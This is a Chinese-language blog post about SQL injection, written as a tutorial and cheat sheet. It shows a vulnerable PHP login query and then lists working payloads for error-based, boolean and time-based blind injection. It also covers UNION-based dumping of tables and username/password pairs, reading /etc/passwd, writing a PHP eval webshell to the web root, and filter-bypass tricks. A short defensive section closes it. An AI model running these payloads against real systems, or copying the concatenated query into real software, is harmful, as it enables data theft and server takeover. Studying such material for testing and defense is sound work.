    <div class="post-content">
      <h2 id="什么是-SQL-注入"><a href="#什么是-SQL-注入" class="headerlink" title="什么是 SQL 注入"></a>什么是 SQL 注入</h2><p>SQL 注入是把用户输入直接拼接到 SQL 语句中，导致攻击者可以操纵查询逻辑。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存在注入的代码</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">&#123;$_POST[&#x27;user&#x27;]&#125;</span>&#x27; AND password = &#x27;<span class="subst">&#123;$_POST[&#x27;pass&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<h2 id="注入类型区分"><a href="#注入类型区分" class="headerlink" title="注入类型区分"></a>注入类型区分</h2><h3 id="数字型-vs-字符型"><a href="#数字型-vs-字符型" class="headerlink" title="数字型 vs 字符型"></a>数字型 vs 字符型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数字型：直接传数字</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  <span class="comment">-- 正常</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>  <span class="comment">-- 异常，说明存在注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 字符型：需要闭合引号</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  <span class="comment">-- 正常</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>  <span class="comment">-- 异常</span></span><br></pre></td></tr></table></figure>

<h3 id="报错-vs-布尔-vs-时间"><a href="#报错-vs-布尔-vs-时间" class="headerlink" title="报错 vs 布尔 vs 时间"></a>报错 vs 布尔 vs 时间</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 报错注入：数据库错误信息直接回显</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1, concat(0x7e, (select database()))) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 布尔盲注：页面有 True/False 差异</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 时间盲注：无回显时用延时判断</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))&gt;115, sleep(3), 0) --+</span></span><br></pre></td></tr></table></figure>

<h2 id="联合查询（Union）"><a href="#联合查询（Union）" class="headerlink" title="联合查询（Union）"></a>联合查询（Union）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 先测列数</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+  -&gt; 报错，说明 3 列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 联合查询查数据</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br><span class="line"><span class="string">-- 页面显示 2 和 3，说明回显位是第 2、3 列</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 爆库</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),version() <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆表</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 爆字段</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 脱数据</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,0x7e,password),3 from users --+</span></span><br></pre></td></tr></table></figure>

<h2 id="读文件-写-Webshell"><a href="#读文件-写-Webshell" class="headerlink" title="读文件 &#x2F; 写 Webshell"></a>读文件 &#x2F; 写 Webshell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 读文件（需要 file 权限）</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,load_file(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;),3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 写 Webshell</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>,<span class="number">3</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/shell.php&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h2 id="常用-Bypass-技巧"><a href="#常用-Bypass-技巧" class="headerlink" title="常用 Bypass 技巧"></a>常用 Bypass 技巧</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 空格被拦 → /**/ 代替</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,2,3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 关键字被拦 → 双写</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> uniunionon selselectect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 逗号被拦 → join 绕过</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select * from (select 1)a join (select 2)b join (select 3)c --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 等号被拦 → like</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> username <span class="keyword">like</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 引号被拦 → 十六进制</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x74657374 --+</span></span><br></pre></td></tr></table></figure>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方案一：参数化查询（推荐）</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方案二：白名单验证</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">die</span>(<span class="string">&#x27;Invalid id&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方案三：最小权限原则</span></span><br><span class="line"><span class="comment">// 数据库用户只给 SELECT 权限，不给 FILE、DROP 等高危权限</span></span><br></pre></td></tr></table></figure>

  <script>
    // 星空粒子
    const c = document.getElementById('stars-canvas'), ctx = c.getContext('2d');
    let stars = [];
    function rs() { c.width = innerWidth; c.height = innerHeight; }
    rs(); addEventListener('resize', rs);
    for (let i = 200; i--;) stars.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*1.8+0.3,a:Math.random(),s:Math.random()*0.008+0.003});
    function dr() { ctx.clearRect(0,0,c.width,c.height); for (const st of stars) { st.a+=st.s; const o=(Math.sin(st.a)+1)/2*0.6+0.1; ctx.beginPath(); ctx.arc(st.x,st.y,st.r,0,Math.PI*2); ctx.fillStyle=`rgba(240,245,242,${o})`; ctx.fill(); } requestAnimationFrame(dr); }
    dr();
